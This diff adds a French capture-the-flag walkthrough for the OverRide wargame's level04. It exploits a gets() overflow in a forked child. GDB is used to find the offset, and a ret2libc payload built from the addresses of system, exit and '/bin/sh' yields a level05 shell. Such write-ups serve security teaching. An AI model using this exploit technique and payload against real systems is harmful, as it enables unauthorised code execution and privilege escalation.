@@ -1,0 +1,42 @@
+Un programme prenant un paramètre dans l'entrée standard à l'aide de la fonction gets.
+On pense donc à un bufferOverflow comme on à déja pu faire. Par contre, ce gets est effectué dans le processus
+fils d'un fork(), donc pas de segfault par défault. On peut néanmoins demander à GDB de tracker aussi ce qui se
+passe dans l'enfant avec "set follow-fork-mode child"
+	(gdb) set follow-fork-mode child
+
+On peut maintenant essayer de faire segfault
+	(gdb) r
+	Starting program: /home/users/level04/level04
+	[New process 2730]
+	Give me some shellcode, k
+	AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+	[Inferior 2 (process 2730) exited normally]
+Pas de segfault, on augmente la taille de la chaîne:
+
+	Give me some shellcode, k
+	AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+
+	Program received signal SIGSEGV, Segmentation fault.
+	[Switching to process 2732]
+	0x4e4e4e4e in ?? ()
+On segfault sur les deuxième N, on a donc (24+16)*4 - 4 avant segfault, soit 156 caractèes.
+
+On finit par se rendre compte que ptrace nous empeche de faire un appel à exec. On va tenter un ret2libc
+pour quitter l'enfant, puis effectuer un appel à /bin/sh.
+Il nous donc les adresses de system, exit ainsi que /bin/sh.
+
+	(gdb) info function system
+	0xf7e6aed0  system
+
+	(gdb) info function exit
+	0xf7e5eb70  exit
+
+	(gdb) find &system,+9999999,"/bin/sh"
+	0xf7f897ec
+
+
+python -c 'print "A"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > /tmp/exploit
+	level04@OverRide:~$ cat /tmp/exploit - | ./level04
+	Give me some shellcode, k
+	whoami
+	level05
